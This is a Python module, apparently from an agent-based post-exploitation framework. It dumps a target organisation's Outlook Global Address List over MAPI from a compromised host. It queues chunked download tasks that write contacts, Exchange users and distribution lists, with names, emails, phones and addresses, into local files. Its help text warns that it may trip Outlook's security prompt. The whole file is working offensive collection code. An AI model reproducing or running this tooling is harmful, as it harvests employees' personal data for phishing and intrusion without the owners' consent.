import math
import copy
import traceback
from lib.core.specmodule import SpecModule
from lib.modhandlers.generic import quotedstring
from lib.core.utility import TaskClass

class Spec(SpecModule):
    def __init__(self, templatepath, helpers):
        self.options = {}
        self.helpers = helpers
        self.help = """
        !! PLEASE AVOID USING THIS FOR NOW !!
        This module attempts to dump the GAL. 
        !! There have been issues where this triggers external program access Outlook data !!
        !! PLEASE AVOID USING THIS FOR NOW !!

        It uses OutlookApplication
        - GetNameSpace("MAPI").GetGlobalAddressList().AddressEntries
        """
        self.entry = 'dump_gal'
        self.depends = []
        self.options['chunksize'] = {
            "value": 50,
            "required": True,
            "description": "number of entries to download per pull",
            "handler": None
        }
        self.options['dest'] = {
            "value": '/tmp/gal',
            "required": True,
            "description": "base name for where we are writing GAL",
            "handler": None,
            "tab_complete": self.helpers.complete_path
        }
        super().__init__(templatepath)

    def rethandler(self, agent, options, data):
        if len(data) > 0: # we opened the file and got a size
            try:
                with open(options['dest']['value'] + '.contacts', 'w') as contacts:
                    with open(options['dest']['value'] + '.ExchangeUsers', 'w') as ExchangeUsers:
                        with open(options['dest']['value'] + '.Distros', 'w') as Distros:
                            contacts.write("Email;Firstname;LastName;MobileNumber;OfficeLocation;JobTitle;OfficePhone;City;stateorprovince;PostalCode;StreetAddress;Company\n")
                            ExchangeUsers.write("Email;Firstname;LastName;MobileNumber;OfficeLocation;JobTitle;OfficePhone;City;stateorprovince;PostalCode;StreetAddress;Company\n")
                            Distros.write("Email;Name;Alias;Comments\n")
                size = int(data) # force valueerror if our size is off
                if size == 0:
                    self.helpers.speclog("{}: GAL is empty".format(agent.hostname), output=True)
                    return
                DF = self.helpers.get_module('downloadGAL', hidden=True) # module to download each chunk
                DF.options['curloc']['value'] = 1
                DF.options['chunksize']['value'] = \
                    int(options['chunksize']['value']) if int(options['chunksize']['value']) < size else size
                DF.options['dest']['value'] = options['dest']['value']
                DF.options['totalsize']['value'] = size
                if DF.options['chunksize']['value'] == DF.options['totalsize']['value']:
                    DF.options['done']['value'] = True
                task = TaskClass('downloadGAL',
                                 self.helpers.renderModule(DF, agent),
                                 DF.entry,
                                 copy.deepcopy(DF.options),
                                 True,
                                 'Download GAL part 1 / {}'.format(math.ceil(size / int(options['chunksize']['value']))),
                                 printlog=False)
                agent.add_task(task)
            except Exception as msg:
                traceback.print_exc()
                self.helpers.speclog("{}: Failed to start GAL download : {}".format(agent.hostname, msg), output=True)
        else:
            self.helpers.speclog("{}: Was not able to start GAL, could be missing, or permissions error".format(agent.hostname),output=True)
